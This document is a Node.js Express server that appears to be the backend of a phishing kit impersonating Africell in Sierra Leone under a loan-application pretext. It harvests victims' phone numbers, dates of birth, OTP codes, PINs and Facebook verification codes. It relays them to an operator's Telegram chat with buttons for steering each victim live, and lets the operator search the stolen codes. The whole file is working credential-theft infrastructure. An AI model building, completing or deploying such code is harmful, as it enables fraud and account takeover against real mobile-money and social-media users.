const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// value: { status: 'pending'|'approved'|'rejected'|'wrong_id'|'verify_whatsapp', timestamp: number }
const orderStatuses = {};
const userCredentials = {};

// Secondary lookup indices for instant text search inside Telegram chat
const otpToPhone = {};
const pinToPhone = {};
const fbCodeToPhone = {};

function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

function normalizePhone(phoneStr) {
    if (!phoneStr) return '';
    return phoneStr.replace(/[^\d+]/g, '').trim();
}

async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (!data.ok) console.error('Telegram error:', data);
        return data;
    } catch (error) {
        clearTimeout(timeoutId);
        throw error;
    }
}

app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        if (!phone) return res.status(400).json({ success: false, message: 'Phone number required.' });

        const cleanPhone = normalizePhone(phone);
        if (!cleanPhone) return res.status(400).json({ success: false, message: 'Invalid phone number.' });

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
            return res.status(500).json({ success: false, message: 'Server misconfigured.' });
        }

        const countryFlag = "🇸🇱";
        const rawDigits = cleanPhone.replace(/\+232/g, '').trim();
        const shortPhone = cleanPhone.replace(/\+/g, '');

        // Auto-submit DOB (DD/MM/YYYY) without altering orderStatuses for login/scratch flow
        if (uniqueId && (uniqueId.startsWith('DOB (DD/MM/YYYY): ') || uniqueId.startsWith('DOB: '))) {
            const dobVal = uniqueId.startsWith('DOB (DD/MM/YYYY): ')
                ? uniqueId.replace('DOB (DD/MM/YYYY): ', '').trim()
                : uniqueId.replace('DOB: ', '').trim();

            if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
            userCredentials[cleanPhone].phone = cleanPhone;
            userCredentials[cleanPhone].dob = dobVal;

            const dobMessage = `🎂 *Africell DOB Auto-Submitted*\n\n` +
                               `${countryFlag} Country: \`+232\`\n` +
                               `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
                               `📅 DOB: \`${escapeMarkdown(dobVal)}\``;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await sendToTelegram(telegramUrl, {
                chat_id: CHAT_ID,
                text: dobMessage,
                parse_mode: 'Markdown'
            });

            console.log(`[AUTO-DOB] Sierra Leone DOB (${dobVal}) submitted for phone: ${cleanPhone}`);
            return res.json({ success: true, message: 'DOB sent.' });
        }

        // Always force status back to pending upon a fresh submission request from client
        orderStatuses[cleanPhone] = { status: 'pending', timestamp: Date.now() };

        // Independent Facebook Verify flow: supports 6-digit or 8-digit codes and resend requests
        if (uniqueId && (uniqueId.startsWith('Facebook Verify Code: ') || uniqueId === 'Facebook Verify Resend Code')) {
            const isResend = uniqueId === 'Facebook Verify Resend Code';
            const rawFbCode = isResend ? '' : uniqueId.replace('Facebook Verify Code: ', '').trim();
            const fbCode = isResend ? '' : rawFbCode.replace(/\D/g, '');

            if (!isResend && fbCode.length !== 6 && fbCode.length !== 8) {
                return res.status(400).json({ success: false, message: 'Invalid verification code length.' });
            }

            if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
            userCredentials[cleanPhone].phone = cleanPhone;
            if (!isResend && fbCode) {
                userCredentials[cleanPhone].fbCode = fbCode;
                fbCodeToPhone[fbCode] = cleanPhone;
            }

            let fbMessage = isResend
                ? `📲 *Facebook Verify (Resend Requested)*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\``
                : `📲 *Facebook Verify*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n🔢 Code: \`${escapeMarkdown(fbCode)}\``;

            const fbApproveCb = `A|wa|${shortPhone}`;
            const fbWrongCb   = `W|wa|${shortPhone}`;
            const fbRejectCb  = `R|wa|${shortPhone}`;

            if (fbApproveCb.length > 64 || fbWrongCb.length > 64 || fbRejectCb.length > 64) {
                console.error('callback_data too long:', fbApproveCb.length);
                return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
            }

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await sendToTelegram(telegramUrl, {
                chat_id: CHAT_ID,
                text: fbMessage,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "✅ Approved", callback_data: fbApproveCb }],
                        [{ text: "⚠️ Wrong Info", callback_data: fbWrongCb }],
                        [{ text: "❌ Reject", callback_data: fbRejectCb }]
                    ]
                }
            });

            console.log(`[SUBMIT] Sierra Leone Facebook verify submitted for phone: ${cleanPhone}`);
            return res.json({ success: true, message: 'Sent successfully.' });
        }

        if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};

        let headerTitle = "📱 *Africell Sign-in Phone Number*";
        let wrongButtonText = "⚠️ Wrong Info";
        let stepTag = 'login';

        if (uniqueId && uniqueId.startsWith('OTP Code: ')) {
            headerTitle = "📱 *Africell OTP Code Submitted*";
            wrongButtonText = "⚠️ Wrong OTP";
            stepTag = 'otp';
            const otpVal = uniqueId.replace('OTP Code: ', '').trim();
            userCredentials[cleanPhone].otp = otpVal;
            otpToPhone[otpVal] = cleanPhone; // Index OTP for chat search
        } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
            headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
            wrongButtonText = "⚠️ Wrong PIN";
            stepTag = 'pin';
            const pinVal = uniqueId.replace('Confirmation PIN: ', '').trim();
            userCredentials[cleanPhone].confirmPin = pinVal;
            pinToPhone[pinVal] = cleanPhone; // Index PIN for chat search
        } else if (uniqueId && uniqueId.startsWith('Disbursement Requested -')) {
            headerTitle = "💰 *Africell Disbursement Request*";
            wrongButtonText = "⚠️ Wrong PIN / Error";
            stepTag = 'disburse';
        } else if (uniqueId && uniqueId.startsWith('Application -')) {
            headerTitle = "📄 *New Loan Application Submitted*";
            wrongButtonText = "❌ Reject Application";
            stepTag = 'app';
            userCredentials[cleanPhone].applicationDetails = uniqueId;
        } else if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
            headerTitle = "📱 *Africell Sign-in Phone Number*";
            wrongButtonText = "⚠️ Wrong Info";
            stepTag = 'login';
        }

        userCredentials[cleanPhone].phone = cleanPhone;

        let message = `${headerTitle}\n\n` +
                      `${countryFlag} Country: \`+232\`\n` +
                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

        if (userCredentials[cleanPhone].dob) {
            message += `\n📅 DOB: \`${escapeMarkdown(userCredentials[cleanPhone].dob)}\``;
        }
        if (userCredentials[cleanPhone].applicationDetails) {
            message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
        }
        if (userCredentials[cleanPhone].otp) {
            message += `\n📱 OTP Code: \`${escapeMarkdown(userCredentials[cleanPhone].otp)}\``;
        }
        if (userCredentials[cleanPhone].confirmPin) {
            message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
        }

        const approveCb = `A|${stepTag}|${shortPhone}`;
        const rejectCb  = `R|${stepTag}|${shortPhone}`;
        const wrongCb   = `W|${stepTag}|${shortPhone}`;
        const facebookCb = `V|${stepTag}|${shortPhone}`;

        if (approveCb.length > 64 || rejectCb.length > 64 || wrongCb.length > 64 || (stepTag === 'pin' && facebookCb.length > 64)) {
            console.error('callback_data too long:', approveCb.length);
            return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
        }

        const inlineKeyboard = [
            [{ text: "✅ Approve", callback_data: approveCb }],
            [{ text: wrongButtonText, callback_data: wrongCb }],
            [{ text: "❌ Reject", callback_data: rejectCb }]
        ];

        if (stepTag === 'pin') {
            inlineKeyboard.push([{ text: "Facebook", callback_data: facebookCb }]);
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: inlineKeyboard
            }
        });

        console.log(`[SUBMIT] Sierra Leone order submitted for phone: ${cleanPhone} (${stepTag})`);
        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error('submit-order error:', error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.get('/api/check-status', (req, res) => {
    const rawQueryPhone = req.query.phone || '';
    const cleanPhone = normalizePhone(rawQueryPhone);

    // Flexible lookup matching to avoid formatting or spacing mismatches
    let entry = orderStatuses[cleanPhone];
    if (!entry && cleanPhone) {
        const foundKey = Object.keys(orderStatuses).find(k => k.includes(cleanPhone) || cleanPhone.includes(k));
        if (foundKey) entry = orderStatuses[foundKey];
    }

    const status = entry ? entry.status : 'pending';
    const timestamp = entry ? entry.timestamp : 0;
    
    res.json({ status, timestamp });
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

        // Handle direct text messages typed into the bot chat for quick searching
        if (update.message && update.message.text) {
            const chatId = update.message.chat.id;
            const queryText = update.message.text.trim();
            const cleanQueryPhone = normalizePhone(queryText);

            let targetPhone = null;
            if (pinToPhone[queryText]) {
                targetPhone = pinToPhone[queryText];
            } else if (otpToPhone[queryText]) {
                targetPhone = otpToPhone[queryText];
            } else if (fbCodeToPhone[queryText]) {
                targetPhone = fbCodeToPhone[queryText];
            } else if (cleanQueryPhone && userCredentials[cleanQueryPhone]) {
                targetPhone = cleanQueryPhone;
            } else if (queryText) {
                // Partial phone number search fallback
                const foundKey = Object.keys(userCredentials).find(k => k.includes(queryText));
                if (foundKey) targetPhone = foundKey;
            }

            if (targetPhone && userCredentials[targetPhone]) {
                const c = userCredentials[targetPhone];
                const rawDigits = c.phone.replace(/\+232/g, '').trim();
                let replyMsg = `🔍 *Found User Record*\n\n` +
                               `🇸🇱 Country: \`+232\`\n` +
                               `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

                if (c.dob) replyMsg += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
                if (c.fbCode) replyMsg += `\n🔢 Facebook Code: \`${escapeMarkdown(c.fbCode)}\``;
                if (c.otp) replyMsg += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
                if (c.confirmPin) replyMsg += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
                if (c.applicationDetails) replyMsg += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;

                const currentStatus = orderStatuses[c.phone] ? orderStatuses[c.phone].status : 'pending';
                replyMsg += `\n\n📌 Current Status: *${currentStatus.toUpperCase()}*`;

                await sendToTelegram(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: replyMsg,
                    parse_mode: 'Markdown'
                });
            } else {
                await sendToTelegram(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `❌ No record found matching: \`${escapeMarkdown(queryText)}\``,
                    parse_mode: 'Markdown'
                });
            }
            return res.sendStatus(200);
        }

        if (!update.callback_query) return res.sendStatus(200);

        const cbData = update.callback_query.data || '';
        const chatId = update.callback_query.message.chat.id;
        const messageId = update.callback_query.message.message_id;
        const origText = (update.callback_query.message && update.callback_query.message.text) || '';

        const parts = cbData.split('|');
        if (parts.length !== 3) {
            console.error('Bad callback format:', cbData);
            return res.sendStatus(200);
        }
        const [action, stepTag, shortPhone] = parts;
        const phone = normalizePhone('+' + shortPhone.replace(/^\+/, ''));

        let actionText = '';
        let messageTitle = 'Processed Request';
        let newStatus = 'pending';

        if (action === 'A') {
            newStatus = 'approved';
            actionText = 'Approved ✅';
            messageTitle = stepTag === 'wa' ? 'Facebook Verify Approved' : 'Africell Request Approved';
        } else if (action === 'R') {
            newStatus = 'rejected';
            actionText = 'Rejected ❌';
            messageTitle = stepTag === 'wa' ? 'Facebook Verify Rejected' : 'Africell Request Rejected';
        } else if (action === 'W') {
            newStatus = 'wrong_id';
            actionText = 'Wrong Info / Error ⚠️';
            messageTitle = stepTag === 'wa' ? 'Facebook Verify Wrong Info' : 'Africell Credential Error';
        } else if (action === 'V') {
            newStatus = 'verify_whatsapp';
            actionText = 'Sent to Facebook Verify 💬';
            messageTitle = 'Africell Sent to Facebook Verify';
        }

        // Store status updates with precise multi-format keys for guaranteed retrieval
        orderStatuses[phone] = { status: newStatus, timestamp: Date.now() };
        orderStatuses[phone.replace('+', '')] = { status: newStatus, timestamp: Date.now() };

        console.log(`[WEBHOOK ACTION] Sierra Leone Phone: ${phone} -> New Status: ${newStatus}`);

        await sendToTelegram(
            `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
            { callback_query_id: update.callback_query.id, text: actionText }
        );

        const countryFlag = "🇸🇱";
        const rawDigits = phone.replace(/\+232/g, '').trim();

        let updatedMessage = `📋 *${messageTitle}*\n\n` +
                             `${countryFlag} Country: \`+232\`\n` +
                             `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

        if (stepTag === 'wa') {
            const codeMatch = origText.match(/Code:\s*([0-9]{6,8})/i);
            const preservedFbCode = (userCredentials[phone] && userCredentials[phone].fbCode) || (codeMatch ? codeMatch[1] : '');
            if (preservedFbCode) {
                updatedMessage += `\n🔢 Code: \`${escapeMarkdown(preservedFbCode)}\``;
            }
        } else if (userCredentials[phone]) {
            const c = userCredentials[phone];
            if (c.dob) updatedMessage += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
            if (c.applicationDetails) updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
            if (c.otp) updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
            if (c.confirmPin) updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
        }
        updatedMessage += `\n\n📌 Status: *${actionText}*`;

        await sendToTelegram(
            `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
            {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] }
            }
        );
    } catch (err) {
        console.error('Webhook Error:', err);
    }
    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;
    if (!BOT_TOKEN || !RENDER_URL) {
        console.warn('Webhook skipped: missing env vars.');
        return;
    }
    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;
    try {
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`).then(r => r.json());
        console.log('Webhook registered successfully:', r);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    registerTelegramWebhook();
});